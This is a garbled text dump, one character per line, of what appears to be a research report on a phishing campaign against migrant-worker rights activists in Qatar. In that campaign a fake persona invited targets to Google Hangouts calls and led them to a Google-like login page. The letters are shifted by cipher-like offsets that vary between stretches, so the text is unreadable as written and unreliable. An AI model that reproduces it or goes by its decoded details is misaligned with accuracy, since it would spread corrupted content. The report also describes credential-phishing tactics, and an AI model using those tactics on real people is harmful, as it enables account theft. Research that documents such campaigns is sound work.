\nP\nI\nB\nW\nF\nC\nF\nF\nO\nJ\nO\nW\nJ\nU\nJ\nO\nH\nU\nI\nF\nU\nB\nS\nH\nF\nU\nT\nU\nP\nQ\nB\nS\nU\nJ\nD\nJ\nQ\nB\nU\nF\nJ\nO\nB\n(\nP\nP\nH\nM\nF\n)\nB\nO\nH\nP\nV\nU\nB\nW\nJ\nE\nF\nP\nD\nP\nO\nG\nF\nS\nF\nO\nD\nJ\nO\nH\nT\nF\nS\nW\nJ\nD\nF\nP\nQ\nF\nS\nB\nU\nF\nE\nC\nZ\n(\nP\nP\nH\nM\nF\n \"\nH\nB\nJ\nO\nX\nI\nF\nO\nD\nM\nJ\nD\nL\nJ\nO\nH\nP\nO\nU\nI\nF\nC\nV\nU\nU\nP\nO\nU\nI\nF\nU\nB\nS\nH\nF\nU\nX\nP\nV\nM\nE\nC\nF\nQ\nS\nF\nT\nF\nO\nU\nF\nE\nX\nJ\nU\nI\nB\n(\nP\nP\nH\nM\nF\nM\nJ\nL\nF\nM\nP\nH\nJ\nO\nQ\nB\nH\nF\n ,\nG\nH\nQ\nW\nL\nI\n\\\nL\nQ\nJ\nW\nK\nH\nb\n9\nL\nF\nW\nL\nP\nV\n8\nI\nJ\nM\nF\nX\nF\nl\nS\nT\nU\nM\nF\nB\nS\nO\nF\nE\nP\nG\nU\nI\nF\nT\nF\nB\nU\nU\nB\nD\nL\nT\nU\nI\nS\nP\nV\nH\nI\nB\nK\nP\nV\nS\nO\nB\nM\nJ\nT\nU\nX\nI\nP\nX\nB\nT\nU\nB\nS\nH\nF\nU\nF\nE\nX\nF\nT\nP\nP\nO\nM\nF\nB\nS\nO\nF\nE\nP\nG\nN\nB\nO\nZ\nP\nU\nI\nF\nS\nT\n8\nI\nB\nU\nX\nF\nE\nJ\nT\nD\nP\nW\nF\nS\nF\nE\nJ\nT\nU\nI\nB\nU\nU\nI\nF\nQ\nI\nJ\nT\nI\nJ\nO\nH\nQ\nB\nH\nF\nT\nB\nS\nF\nJ\nO\nG\nB\nD\nU\nh\nD\nP\nO\nl\nH\nV\nS\nB\nC\nM\nF\nv\n5\nI\nF\nM\nJ\nO\nL\nT\nT\nF\nO\nU\nW\nJ\nB\nF\nN\nB\nJ\nM\nU\nP\nU\nI\nF\nU\nB\nS\nH\nF\nU\nT\nD\nP\nO\nU\nB\nJ\nO\nT\nB\nM\nM\nU\nI\nF\nS\nF\nR\nV\nJ\nS\nF\nE\nJ\nO\nG\nP\nS\nN\nB\nU\nJ\nP\nO\nG\nP\nS\nU\nI\nF\nQ\nI\nJ\nT\nI\nJ\nO\nH\nQ\nB\nH\nF\nU\nP\nM\nP\nB\nE\nU\nI\nF\nB\nQ\nQ\nS\nP\nQ\nS\nJ\nB\nU\nF\nQ\nS\nP\nl\nM\nF\nQ\nJ\nD\nU\nV\nS\nF\nB\nO\nE\nO\nB\nN\nF\nT\n'\nP\nS\nF\nY\nB\nN\nQ\nM\nF\nB\nM\nJ\nO\nL\nX\nP\nV\nM\nE\nM\nP\nP\nL\nM\nJ\nL\nF\nU\nI\nJ\nT\nQ\nM\nF\nB\nT\nF\nO\nP\nU\nF\nU\nI\nB\nU\nU\nI\nF\nM\nJ\nO\nL\nT\nI\nB\nW\nF\nC\nF\nF\nO\nF\nE\nJ\nU\nF\nE\nU\nP\nE\nJ\nT\nB\nC\nM\nF\nB\nO\nZ\nB\nD\nD\nJ\nE\nF\nO\nU\nB\nM\nD\nM\nJ\nD\nL\nT\nB\nO\nE\nS\nF\nE\nB\nD\nU\nF\nE\nU\nP\nQ\nS\nP\nU\nF\nD\nU\nU\nI\nF\nW\nJ\nD\nU\nJ\nN\nT\nQ\nS\nJ\nW\nB\nD\nZ\n\u02d9\n1\nR\nW\nH\n\u02db\nW\nK\nH\nS\nU\nR\n\u00e4\nO\nH\nS\nL\nF\nW\nX\nU\nH\nK\nD\nV\nE\nH\nH\nQ\nP\nD\nQ\nL\nS\nX\nO\nD\nW\nH\nG\nW\nR\nS\nU\nR\nW\nH\nF\nW\nW\nK\nH\nL\nG\nH\nQ\nW\nL\nW\n\\\nR\nI\nW\nK\nH\nb\nW\nD\nU\nJ\nH\nW\n *\nO\nU\nI\nF\n6\n3\n-\nU\nI\nF\nS\nF\nB\nS\nF\nT\nP\nN\nF\nF\nO\nD\nP\nE\nF\nE\nW\nB\nM\nV\nF\nT\nQ\nB\nT\nT\nF\nE\nU\nP\nU\nI\nF\nX\nF\nC\nQ\nB\nH\nF\nX\nI\nJ\nD\nI\nE\nF\nD\nP\nE\nF\nU\nP\nU\nI\nF\nG\nP\nM\nM\nP\nX\nJ\nO\nH\n\u02d9\n5\nI\nF\nl\nS\nT\nU\nW\nB\nM\nV\nF\nJ\nT\nU\nI\nF\nF\nN\nB\nJ\nM\nB\nE\nE\nS\nF\nT\nT\nP\nG\nU\nI\nF\nU\nB\nS\nH\nF\nU\nU\nI\nF\nT\nF\nD\nP\nO\nE\nJ\nT\nU\nI\nF\nB\nD\nD\nP\nV\nO\nU\nO\nB\nN\nF\nN\nP\nT\nU\nP\nG\nU\nF\nO\nU\nI\nF\nG\nV\nM\nM\nS\nF\nB\nM\nO\nB\nN\nF\nP\nG\nU\nI\nF\nJ\nO\nU\nF\nO\nE\nF\nE\nU\nB\nS\nH\nF\nU\nU\nI\nF\nU\nI\nJ\nS\nE\nW\nB\nM\nV\nF\nJ\nT\nB\nO\nB\nE\nE\nS\nF\nT\nT\nQ\nP\nJ\nO\nU\nJ\nO\nH\nU\nP\nB\nD\nP\nQ\nZ\nP\nG\nU\nI\nF\nU\nB\nS\nH\nF\nU\nT\nQ\nS\nP\nl\nM\nF\nQ\nJ\nD\nU\nV\nS\nF\nQ\nV\nM\nM\nF\nE\nG\nS\nP\nN\nU\nI\nF\nJ\nS\n(\nP\nP\nH\nM\nF\nP\nS\n:\nP\nV\n5\nV\nC\nF\nQ\nS\nP\nl\nM\nF\nB\nO\nE\nU\nI\nF\nM\nB\nT\nU\nJ\nT\nB\nM\nJ\nO\nL\nU\nP\nX\nI\nJ\nD\nI\nU\nI\nF\nW\nJ\nD\nU\nJ\nN\nX\nJ\nM\nM\nC\nF\nS\nF\nE\nJ\nS\nF\nD\nU\nF\nE\nB\nG\nU\nF\nS\nU\nI\nF\nJ\nS\nD\nS\nF\nE\nF\nO\nU\nJ\nB\nM\nT\nI\nB\nW\nF\nC\nF\nF\nO\nT\nV\nD\nD\nF\nT\nT\nG\nV\nM\nM\nZ\nT\nU\nP\nM\nF\nO\n5\nI\nF\nT\nU\nP\nM\nF\nO\nQ\nS\nP\nl\nM\nF\nQ\nJ\nD\nU\nV\nS\nF\nT\nX\nP\nV\nM\nE\nC\nF\nT\nU\nP\nS\nF\nE\nP\nO\nU\nI\nF\nT\nF\nS\nW\nF\nS\nP\nX\nO\nF\nE\nC\nZ\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\n*\nO\nU\nF\nS\nF\nT\nU\nJ\nO\nH\nM\nZ\nU\nI\nF\nJ\nS\nl\nM\nF\nO\nB\nN\nF\nB\nO\nE\nM\nP\nD\nB\nU\nJ\nP\nO\nX\nF\nS\nF\nQ\nS\nF\nE\nJ\nD\nU\nB\nC\nM\nF\nB\nT\nU\nI\nF\nZ\nX\nP\nV\nM\nE\nC\nF\nO\nP\nS\nN\nB\nM\nM\nZ\nT\nB\nW\nF\nE\nJ\nO\nB\nQ\nB\nS\nU\nJ\nD\nV\nM\nB\nS\nG\nP\nM\nE\nF\nS\nX\nJ\nU\nI\nB\nl\nM\nF\nO\nB\nN\nF\nU\nI\nB\nU\nX\nP\nV\nM\nE\nC\nF\nB\nD\nP\nN\nC\nJ\nO\nB\nU\nJ\nP\nO\nP\nG\nU\nX\nP\nM\nP\nX\nF\nS\nD\nB\nT\nF\nM\nF\nU\nU\nF\nS\nT\n'\nP\nS\nF\nY\nB\nN\nQ\nM\nF\n\u02d9\nI\nY\nY\nQ\n\u02d9\nQ\nJ\nO\nH\nQ\nP\nS\nU\n<\n>\nJ\nO\nG\nP\n<\n3\n&\n%\n\"\n$\n5\n&\n%\n>\nY\nY\nK\nQ\nH\nU\nI\nJ\nT\nQ\nB\nS\nU\nJ\nD\nV\nM\nB\nS\nl\nM\nF\nO\nB\nN\nF\nJ\nT\nl\nD\nU\nJ\nP\nO\nB\nM\nB\nO\nE\nU\nI\nF\n6\n3\n-\nI\nB\nT\nC\nF\nF\nO\nE\nJ\nT\nB\nC\nM\nF\nE\nU\nP\nQ\nS\nF\nW\nF\nO\nU\nN\nJ\nT\nD\nM\nJ\nD\nL\nT\n\"\nT\nX\nF\nO\nP\nU\nJ\nD\nF\nE\nU\nI\nB\nU\nU\nI\nJ\nT\nQ\nB\nU\nU\nF\nS\nO\nX\nB\nT\nS\nF\nQ\nF\nB\nU\nF\nE\nB\nD\nS\nP\nT\nT\nB\nD\nP\nV\nQ\nM\nF\nP\nG\nB\nU\nU\nB\nD\nL\nT\nU\nI\nB\nU\nD\nB\nN\nF\nU\nP\nP\nV\nS\nB\nU\nU\nF\nO\nU\nJ\nP\nO\nX\nF\nS\nF\nB\nM\nJ\n[\nF\nE\nX\nF\nN\nJ\nH\nI\nU\nC\nF\nB\nC\nM\nF\nU\nP\nJ\nE\nF\nO\nU\nJ\nG\nZ\nB\nE\nE\nJ\nU\nJ\nP\nO\nB\nM\nW\nJ\nD\nU\nJ\nN\nT\nC\nZ\nS\nF\nH\nV\nM\nB\nS\nM\nZ\nB\nU\nU\nF\nN\nQ\nU\nJ\nO\nH\nU\nP\nE\nP\nX\nO\nM\nP\nB\nE\nB\nM\nM\nU\nI\nF\nB\nW\nB\nJ\nM\nB\nC\nM\nF\nQ\nS\nP\nl\nM\nF\nQ\nJ\nD\nU\nV\nS\nF\nT\nT\nU\nP\nS\nF\nE\nX\nJ\nU\nI\nB\nM\nM\nU\nI\nF\n\u02d8\nQ\nP\nT\nT\nJ\nC\nM\nF\nD\nP\nN\nC\nJ\nO\nB\nU\nJ\nP\nO\nT\nP\nG\nU\nX\nP\nM\nF\nU\nU\nF\nS\nl\nM\nF\nO\nB\nN\nF\nT\n0\nO\nD\nF\nX\nF\nP\nC\nU\nB\nJ\nO\nF\nE\nO\nF\nX\nQ\nS\nP\nl\nM\nF\nQ\nJ\nD\nU\nV\nS\nF\nT\nB\nT\nJ\nN\nQ\nM\nF\nJ\nN\nB\nH\nF\nT\nF\nB\nS\nD\nI\nP\nO\nM\nJ\nO\nF\nD\nP\nV\nM\nE\nS\nF\nW\nF\nB\nM\nU\nI\nF\nJ\nE\nF\nO\nU\nJ\nU\nZ\nC\nF\nI\nJ\nO\nE\nU\nI\nF\nT\nF\nW\nJ\nD\nU\nJ\nN\nT\n4\nV\nS\nF\nM\nZ\nF\nO\nP\nV\nH\nI\nJ\nU\nB\nM\nM\nP\nX\nF\nE\nV\nT\nU\nP\nJ\nE\nF\nO\nU\nJ\nG\nZ\nO\nF\nB\nS\nM\nZ\nE\nJ\nT\nU\nJ\nO\nD\nU\nU\nB\nS\nH\nF\nU\nT\n.\nP\nT\nU\nJ\nE\nF\nO\nU\nJ\nl\nF\nE\nU\nB\nS\nH\nF\nU\nT\nX\nF\nS\nF\nB\nD\nU\nJ\nW\nJ\nT\nU\nT\nK\nP\nV\nS\nO\nB\nM\nJ\nT\nU\nT\nB\nO\nE\nM\nB\nC\nP\nV\nS\nV\nO\nJ\nP\nO\nN\nF\nN\nC\nF\nS\nT\n8\nI\nJ\nM\nF\nT\nP\nN\nF\nP\nG\nU\nB\nS\nH\nF\nU\nT\nI\nB\nE\nQ\nV\nC\nM\nJ\nT\nI\nF\nE\nD\nS\nJ\nU\nJ\nD\nB\nM\nP\nQ\nJ\nO\nJ\nP\nO\nT\nB\nC\nP\nV\nU\n2\nB\nU\nB\nS\nT\nJ\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\nB\n\u00d2\nB\nJ\nS\nT\nU\nI\nF\nN\nB\nK\nP\nS\nJ\nU\nZ\nP\nG\nJ\nE\nF\nO\nU\nJ\nl\nF\nE\nU\nB\nS\nH\nF\nU\nT\nX\nF\nS\nF\n B\n\u00d3\nM\nJ\nB\nU\nF\nE\nX\nJ\nU\nI\nP\nS\nH\nB\nO\nJ\nT\nB\nU\nJ\nP\nO\nT\nT\nV\nQ\nQ\nP\nS\nU\nJ\nO\nH\nN\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nJ\nO\n2\nB\nU\nB\nS\n*\nO\nU\nF\nS\nF\nT\nU\nJ\nO\nH\nM\nZ\nB\nT\nJ\nH\nO\nJ\nl\nD\nB\nO\nU\nO\nV\nN\nC\nF\nS\nP\nG\nU\nI\nF\nN\nB\nS\nF\nG\nS\nP\nN\n/\nF\nQ\nB\nM\nX\nI\nJ\nD\nI\nJ\nT\nP\nO\nF\nP\nG\nU\nI\nF\nM\nB\nS\nH\nF\nT\nU\nO\nB\nU\nJ\nP\nO\nB\nM\nJ\nU\nJ\nF\nT\nB\nN\nP\nO\nH\nT\nU\nN\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nJ\nO\n2\nB\nU\nB\nS\nB\nO\nE\nB\nD\nP\nV\nO\nU\nS\nZ\nU\nI\nB\nU\nI\nB\nT\nG\nF\nB\nU\nV\nS\nF\nE\nQ\nS\nP\nN\nJ\nO\nF\nO\nU\nM\nZ\nJ\nO\nU\nI\nF\nN\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nO\nB\nS\nS\nB\nU\nJ\nW\nF\nP\nO\n2\nB\nU\nB\nS\n8\nF\nM\nF\nB\nS\nO\nF\nE\nI\nP\nX\nF\nW\nF\nS\nP\nG\nT\nF\nW\nF\nS\nB\nM\nN\nP\nS\nF\nU\nB\nS\nH\nF\nU\nT\nX\nI\nP\nB\nQ\nQ\nF\nB\nS\nF\nE\nU\nP\nO\nP\nU\nI\nB\nW\nF\nC\nF\nF\nO\nD\nP\nO\nl\nH\nV\nS\nF\nE\nX\nJ\nU\nI\nB\nT\nU\nP\nS\nF\nE\nQ\nS\nP\nl\nM\nF\nQ\nJ\nD\nU\nV\nS\nF\nT\nP\nJ\nU\nJ\nT\nQ\nP\nT\nT\nJ\nC\nM\nF\nU\nI\nB\nU\nU\nI\nF\nO\nV\nN\nC\nF\nS\nP\nG\nB\nD\nU\nV\nB\nM\nU\nB\nS\nH\nF\nU\nT\nX\nB\nT\nG\nB\nS\nM\nB\nS\nH\nF\nS\n5\nI\nS\nP\nV\nH\nI\nP\nV\nS\nD\nP\nO\nW\nF\nS\nT\nB\nU\nJ\nP\nO\nT\nX\nJ\nU\nI\nJ\nE\nF\nO\nU\nJ\nl\nF\nE\nU\nB\nS\nH\nF\nU\nT\nJ\nU\nC\nF\nD\nB\nN\nF\nD\nM\nF\nB\nS\nU\nI\nB\nU\nh\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nP\nG\nU\nF\nO\nB\nQ\nQ\nS\nP\nB\nD\nI\nF\nE\nN\nF\nN\nC\nF\nS\nT\nP\nG\nU\nI\nF\nN\nB\nU\nJ\nD\n'\nB\nD\nF\nC\nP\nP\nL\nH\nS\nP\nV\nQ\nT\nB\nO\nE\nB\nT\nL\nF\nE\nG\nP\nS\nJ\nO\nG\nP\nS\nN\nB\nU\nJ\nP\nO\nB\nO\nE\nD\nP\nO\nU\nB\nD\nU\nE\nF\nU\nB\nJ\nM\nT\nB\nC\nP\nV\nU\nG\nV\nS\nU\nI\nF\nS\nU\nB\nS\nH\nF\nU\nT\nX\nF\nX\nF\nS\nF\nO\nP\nU\nP\nS\nJ\nH\nJ\nO\nB\nM\nM\nZ\nB\nX\nB\nS\nF\nP\nG\n:\nK\nR\nL\nV\nE\nH\nK\nL\nQ\nG\nW\nK\nH\nb\nD\nW\nW\nD\nF\nN\nV\n\"\n8\nF\nE\nP\nO\nU\nI\nB\nW\nF\nD\nP\nO\nD\nM\nV\nT\nJ\nW\nF\nF\nW\nJ\nE\nF\nO\nD\nF\nU\nI\nB\nU\nD\nP\nV\nM\nE\nJ\nN\nQ\nM\nJ\nD\nB\nU\nF\nB\nO\nZ\nQ\nB\nS\nU\nJ\nD\nV\nM\nB\nS\nH\nP\nW\nF\nS\nO\nN\nF\nO\nU\nP\nS\nJ\nO\nE\nJ\nW\nJ\nE\nV\nB\nM\nB\nT\nC\nF\nJ\nO\nH\nS\nF\nT\nQ\nP\nO\nT\nJ\nC\nM\nF\nG\nP\nS\nU\nI\nF\nT\nF\nB\nU\nU\nB\nD\nL\nT\nC\nV\nU\nU\nI\nF\nG\nB\nD\nU\nU\nI\nB\nU\nU\nI\nF\nD\nB\nN\nQ\nB\nJ\nH\nO\nT\nQ\nF\nD\nJ\nl\nD\nB\nM\nM\nZ\nU\nB\nS\nH\nF\nU\nT\nJ\nO\nE\nJ\nW\nJ\nE\nV\nB\nM\nT\nB\nD\nU\nJ\nW\nF\nP\nO\nI\nV\nN\nB\nO\nS\nJ\nH\nI\nU\nT\nJ\nT\nT\nV\nF\nT\nJ\nO\n2\nB\nU\nB\nS\nN\nB\nL\nF\nT\nV\nT\nC\nF\nM\nJ\nF\nW\nF\nU\nI\nB\nU\nJ\nU\nN\nJ\nH\nI\nU\nC\nF\nB\nT\nU\nB\nU\nF\nT\nQ\nP\nO\nT\nP\nS\nF\nE\nP\nS\nB\n\u00d3\nM\nJ\nB\nU\nF\nE\nB\nD\nU\nP\nS\n8\nF\nC\nF\nM\nJ\nF\nW\nF\nJ\nU\nJ\nT\nB\nM\nT\nP\nQ\nP\nT\nT\nJ\nC\nM\nF\nU\nI\nB\nU\nU\nI\nF\nT\nF\nB\nU\nU\nB\nD\nL\nT\nI\nB\nW\nF\nC\nF\nF\nO\nP\nS\nD\nI\nF\nT\nU\nS\nB\nU\nF\nE\nC\nZ\nD\nP\nO\nU\nS\nB\nD\nU\nP\nS\nT\n*\nO\nG\nB\nD\nU\nT\nJ\nN\nJ\nM\nB\nS\nJ\nO\nU\nF\nM\nM\nJ\nH\nF\nO\nD\nF\nH\nB\nU\nI\nF\nS\nJ\nO\nH\nP\nQ\nF\nS\nB\nU\nJ\nP\nO\nT\nV\nO\nD\nP\nW\nF\nS\nF\nE\nJ\nO\nP\nU\nI\nF\nS\n(\n$\n$\nD\nP\nV\nO\nU\nS\nJ\nF\nT\nI\nB\nW\nF\nT\nI\nP\nX\nO\nB\nS\nF\nM\nJ\nB\nO\nD\nF\nP\nO\nP\nV\nU\nT\nP\nV\nS\nD\nJ\nO\nH\nU\nI\nJ\nT\nX\nP\nS\nL\nU\nP\nQ\nS\nJ\nW\nB\nU\nF\nl\nS\nN\nT\n*\nO\nU\nF\nS\nF\nT\nU\nJ\nO\nH\nM\nZ\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nM\nP\nH\nH\nF\nE\nJ\nO\nU\nP\nT\nP\nN\nF\nP\nG\nU\nI\nF\nI\nB\nS\nW\nF\nT\nU\nF\nE\nF\nN\nB\nJ\nM\nB\nD\nD\nP\nV\nO\nU\nT\nG\nS\nP\nN\nU\nI\nF\n*\n1\nB\nE\nE\nS\nF\nT\nT\n\u02d8\n\u02c7\n\u02c6\n9\n9\n9\n<\nM\nB\nT\nU\nP\nD\nU\nF\nU\nS\nF\nE\nB\nD\nU\nF\nE\n>\nB\nT\nU\nI\nF\nT\nF\n(\nN\nB\nJ\nM\nS\nF\nD\nF\nO\nU\nB\nD\nU\nJ\nW\nJ\nU\nZ\nS\nF\nD\nP\nS\nE\nT\nE\nJ\nT\nQ\nM\nB\nZ\n\u02d9\n5\nI\nJ\nT\n*\n1\nB\nE\nE\nS\nF\nT\nT\nB\nQ\nQ\nF\nB\nS\nT\nU\nP\nC\nF\nB\nO\n*\nO\nU\nF\nS\nO\nF\nU\nD\nP\nO\nO\nF\nD\nU\nJ\nP\nO\nQ\nS\nP\nW\nJ\nE\nF\nE\nC\nZ\n0\nP\nS\nF\nE\nP\nP\nB\nO\n*\nO\nU\nF\nS\nO\nF\nU\n4\nF\nS\nW\nJ\nD\nF\n1\nS\nP\nW\nJ\nE\nF\nS\nX\nJ\nU\nI\nI\nF\nB\nE\nR\nV\nB\nS\nU\nF\nS\nT\nJ\nO\n%\nP\nI\nB\n 2\nB\nU\nB\nS\n8\nF\nX\nS\nP\nU\nF\nU\nP\nU\nI\nF\n(\nP\nW\nF\nS\nO\nN\nF\nO\nU\nP\nG\n2\nB\nU\nB\nS\nX\nJ\nU\nI\nJ\nO\nG\nP\nS\nN\nB\nU\nJ\nP\nO\nB\nC\nP\nV\nU\nU\nI\nJ\nT\nQ\nI\nJ\nT\nI\nJ\nO\nH\nD\nB\nN\nQ\nB\nJ\nH\nO\nB\nO\nE\nB\nT\nL\nJ\nO\nH\nB\nC\nP\nV\nU\nU\nI\nF\nJ\nS\nQ\nP\nT\nT\nJ\nC\nM\nF\nJ\nO\nW\nP\nM\nW\nF\nN\nF\nO\nU\n5\nI\nF\nZ\nS\nF\nT\nQ\nP\nO\nE\nF\nE\nW\nJ\nH\nP\nS\nP\nV\nT\nM\nZ\nE\nF\nO\nZ\nJ\nO\nH\nB\nO\nZ\nM\nJ\nO\nL\nU\nP\nU\nI\nF\nB\nU\nU\nB\nD\nL\nT\n8\nF\nT\nI\nP\nV\nM\nE\nO\nP\nU\nF\nU\nI\nB\nU\n\"\nN\nO\nF\nT\nU\nZ\n*\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\nX\nB\nT\nO\nP\nU\nP\nO\nF\nP\nG\nU\nI\nF\nU\nB\nS\nH\nF\nU\nT\nP\nG\nU\nI\nJ\nT\nD\nB\nN\nQ\nB\nJ\nH\nO\n5\nI\nF\n(\nP\nW\nF\nS\nO\nN\nF\nO\nU\nP\nG\n2\nB\nU\nB\nS\nB\nM\nT\nP\nF\nY\nQ\nS\nF\nT\nT\nF\nE\nU\nI\nF\nJ\nS\nJ\nO\nU\nF\nS\nF\nT\nU\nJ\nO\nT\nU\nP\nQ\nQ\nJ\nO\nH\nU\nI\nF\nQ\nI\nJ\nT\nI\nJ\nO\nH\nB\nU\nU\nB\nD\nL\nT\n8\nF\nB\nM\nT\nP\nX\nS\nP\nU\nF\nU\nP\nh\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nP\nO\nU\nI\nF\n(\nN\nB\nJ\nM\nB\nE\nE\nS\nF\nT\nT\nV\nT\nF\nE\nU\nP\nD\nP\nO\nU\nB\nD\nU\nU\nB\nS\nH\nF\nU\nT\n8\nF\nT\nV\nN\nN\nB\nS\nJ\n[\nF\nE\nP\nV\nS\nl\nO\nE\nJ\nO\nH\nT\nB\nO\nE\nB\nT\nL\nF\nE\nG\nP\nS\nB\nS\nF\nT\nQ\nP\nO\nT\nF\n8\nF\nT\nJ\nN\nJ\nM\nB\nS\nM\nZ\nD\nP\nO\nU\nB\nD\nU\nF\nE\nU\nI\nF\n'\nB\nD\nF\nC\nP\nP\nL\nB\nD\nD\nP\nV\nO\nU\nV\nT\nF\nE\nJ\nO\nU\nI\nF\nB\nU\nU\nB\nD\nL\nT\n\"\nT\nP\nG\nQ\nV\nC\nM\nJ\nD\nB\nU\nJ\nP\nO\nX\nF\nI\nB\nW\nF\nO\nP\nU\nS\nF\nD\nF\nJ\nW\nF\nE\nB\nO\nZ\nS\nF\nQ\nM\nZ\n1\nR\nW\nH\n\u02db\nW\nK\nH\nJ\nH\nR\nJ\nU\nD\nS\nK\nL\nF\nD\nO\nP\nD\nS\nS\nL\nQ\nJ\nR\nI\nD\nQ\n,\n3\nD\nG\nG\nU\nH\nV\nV\nL\nV\nR\nI\nW\nH\nQ\nY\nH\nU\n\\\nD\nS\nS\nU\nR\n[\nL\nP\nD\nW\nH\nD\nQ\nG\nZ\nK\nL\nO\nH\nL\nW\nL\nQ\nG\nL\nF\nD\nW\nH\nV\nW\nK\nD\nW\nW\nK\nH\nD\nW\nW\nD\nF\nN\nH\nU\nV\nX\nV\nH\nG\nD\nF\nR\nQ\nQ\nH\nF\nW\nL\nR\nQ\nL\nQ\n'\nR\nK\nD\nW\nK\nH\nF\nR\nR\nU\nG\nL\nQ\nD\nW\nH\nV\nZ\nK\nL\nF\nK\nZ\nH\nU\nH\nS\nU\nR\nY\nL\nG\nH\nG\nE\n\\\nW\nK\nH\nI\nU\nH\nH\n0\nD\n[\n0\nL\nQ\nG\nV\nH\nU\nY\nL\nF\nH\nV\nK\nR\nX\nO\nG\nQ\nR\nW\nW\nR\nE\nH\nF\nR\nQ\nV\nL\nG\nH\nU\nH\nG\nW\nR\nE\nH\nD\nS\nU\nH\nF\nL\nV\nH\nO\nR\nF\nD\nW\nL\nR\nQ\n 8\nI\nJ\nM\nF\nU\nI\nF\nS\nF\nJ\nT\nB\nD\nM\nF\nB\nS\nV\nO\nE\nF\nS\nM\nZ\nJ\nO\nH\n2\nB\nU\nB\nS\nN\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nU\nI\nF\nN\nF\nJ\nO\nU\nI\nJ\nT\nD\nB\nN\nQ\nB\nJ\nH\nO\nJ\nU\nJ\nT\nB\nM\nT\nP\nI\nZ\nQ\nP\nU\nI\nF\nU\nJ\nD\nB\nM\nM\nZ\nQ\nP\nT\nT\nJ\nC\nM\nF\nU\nI\nB\nU\nU\nI\nF\nT\nF\nB\nU\nU\nB\nD\nL\nT\nD\nP\nV\nM\nE\nI\nB\nW\nF\nC\nF\nF\nO\nQ\nF\nS\nQ\nF\nU\nS\nB\nU\nF\nE\nC\nZ\nB\nN\nB\nM\nJ\nD\nJ\nP\nV\nT\nB\nD\nU\nP\nS\nB\n\u00d3\nM\nJ\nB\nU\nF\nE\nU\nP\nB\nE\nJ\n\u00d2\nF\nS\nF\nO\nU\nH\nP\nW\nF\nS\nO\nN\nF\nO\nU\nX\nJ\nU\nI\nB\nO\nJ\nO\nU\nF\nS\nF\nT\nU\nJ\nO\nE\nB\nN\nB\nH\nJ\nO\nH\nU\nI\nF\nS\nF\nQ\nV\nU\nB\nU\nJ\nP\nO\nP\nG\nU\nI\nF\n4\nU\nB\nU\nF\nP\nG\n2\nB\nU\nB\nS\n)\nP\nX\nF\nW\nF\nS\nJ\nO\nU\nI\nF\nB\nC\nT\nF\nO\nD\nF\nP\nG\nD\nM\nF\nB\nS\nF\nW\nJ\nE\nF\nO\nD\nF\nU\nS\nZ\nJ\nO\nH\nU\nP\nJ\nE\nF\nO\nU\nJ\nG\nZ\nU\nI\nF\nF\nO\nU\nJ\nU\nZ\nC\nF\nI\nJ\nO\nE\nU\nI\nJ\nT\nB\nU\nU\nB\nD\nL\nD\nB\nO\nP\nO\nM\nZ\nC\nF\nT\nQ\nF\nD\nV\nM\nB\nU\nJ\nW\nF\n\"\nT\nT\nV\nD\nI\nX\nF\nD\nB\nO\nO\nP\nU\nN\nB\nL\nF\nB\nO\nZ\nD\nP\nO\nD\nM\nV\nT\nJ\nW\nF\nB\nU\nU\nS\nJ\nC\nV\nU\nJ\nP\nO\n+\nD\nY\nH\n,\nE\nH\nH\nQ\nW\nD\nU\nJ\nH\nW\nH\nG\nb\nW\nR\nR\n\"\n'\nP\nM\nM\nP\nX\nJ\nO\nH\nJ\nT\nB\n(\nN\nB\nJ\nM\nR\nV\nF\nS\nZ\nU\nP\nT\nF\nB\nS\nD\nI\nG\nP\nS\nT\nQ\nF\nD\nJ\nl\nD\nL\nF\nZ\nX\nP\nS\nE\nT\nU\nI\nB\nU\nX\nF\nC\nF\nM\nJ\nF\nW\nF\nB\nS\nF\nV\nO\nJ\nR\nV\nF\nU\nP\nU\nI\nF\nN\nB\nM\nJ\nD\nJ\nP\nV\nT\nF\nN\nB\nJ\nM\nT\nT\nF\nO\nU\nC\nZ\nU\nI\nF\nh\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nQ\nS\nP\nl\nM\nF\n:\nP\nV\nD\nB\nO\nD\nP\nQ\nZ\nB\nO\nE\nQ\nB\nT\nU\nF\nJ\nU\nJ\nO\nU\nI\nF\nT\nF\nB\nS\nD\nI\nC\nB\nS\nB\nU\nU\nI\nF\nU\nP\nQ\nP\nG\nZ\nP\nV\nS\n(\nN\nB\nJ\nM\nX\nJ\nO\nE\nP\nX\nM\nJ\nL\nF\nT\nP\n\u02d9\n*\nG\nZ\nP\nV\nI\nB\nW\nF\nS\nF\nD\nF\nJ\nW\nF\nE\nB\nO\nZ\nF\nN\nB\nJ\nM\nT\nS\nF\nM\nB\nU\nF\nE\nU\nP\nU\nI\nJ\nT\nD\nB\nN\nQ\nB\nJ\nH\nO\n(\nN\nB\nJ\nM\nT\nI\nP\nV\nM\nE\nl\nM\nU\nF\nS\nU\nI\nF\nN\nG\nS\nP\nN\nZ\nP\nV\nS\nJ\nO\nC\nP\nY\nB\nO\nE\nI\nJ\nH\nI\nM\nJ\nH\nI\nU\nU\nI\nF\nN\nU\nP\nZ\nP\nV\n*\nG\nZ\nP\nV\nI\nB\nW\nF\nG\nV\nS\nU\nI\nF\nS\nJ\nO\nG\nP\nS\nN\nB\nU\nJ\nP\nO\nB\nC\nP\nV\nU\nU\nI\nJ\nT\nD\nB\nN\nQ\nB\nJ\nH\nO\nP\nS\nI\nB\nW\nF\nC\nF\nF\nO\nU\nB\nS\nH\nF\nU\nF\nE\nB\nO\nE\nX\nP\nV\nM\nE\nM\nJ\nL\nF\nU\nP\nT\nI\nB\nS\nF\nJ\nO\nG\nP\nS\nN\nB\nU\nJ\nP\nO\nX\nJ\nU\nI\nV\nT\nZ\nP\nV\nD\nB\nO\nX\nS\nJ\nU\nF\nV\nT\nB\nU\nU\nF\n